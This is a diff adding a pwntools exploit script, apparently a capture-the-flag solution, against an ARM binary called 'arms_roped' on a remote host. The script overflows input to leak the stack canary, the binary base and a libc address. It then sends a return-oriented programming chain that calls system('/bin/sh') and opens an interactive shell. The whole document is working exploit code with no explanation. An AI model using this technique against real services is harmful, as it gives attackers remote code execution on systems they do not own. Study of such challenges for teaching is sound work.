@@ -1,0 +1,33 @@
+from pwn import *
+
+exe = context.binary = ELF('arms_roped')
+libc = ELF("./libc.so.6")
+
+io = remote('94.237.53.219', 58914)
+
+io.sendline(b"A" * 0x21)
+io.recvuntil(b"A" * 0x21)
+canary = u32(io.recv(3).rjust(4, b"\0"))
+
+io.sendline(b"A" * 0x30)
+io.recvuntil(b"A" * 0x30)
+exe.address = u32(io.recv(4).ljust(4, b'\0')) - (exe.sym["main"] + 108)
+
+io.sendline(b"A" * 0x48)
+io.recvuntil(b"A" * 0x48)
+libc_leak = u32(io.recv(4).rjust(4, b'\0'))
+libc.address = libc_leak - 0x1748C - 0x99
+
+gadget = libc.address + 0x0005bebc
+
+payload = b"quit"
+payload += b"A" * (32 - 4)
+payload += p32(canary)
+payload += b"A" * 0xc
+payload += p32(gadget)
+payload += p32(next(libc.search(b"/bin/sh")))
+payload += p32(0xdeadbeef)
+payload += p32(libc.sym["system"])
+
+io.sendline(payload)
+io.interactive()
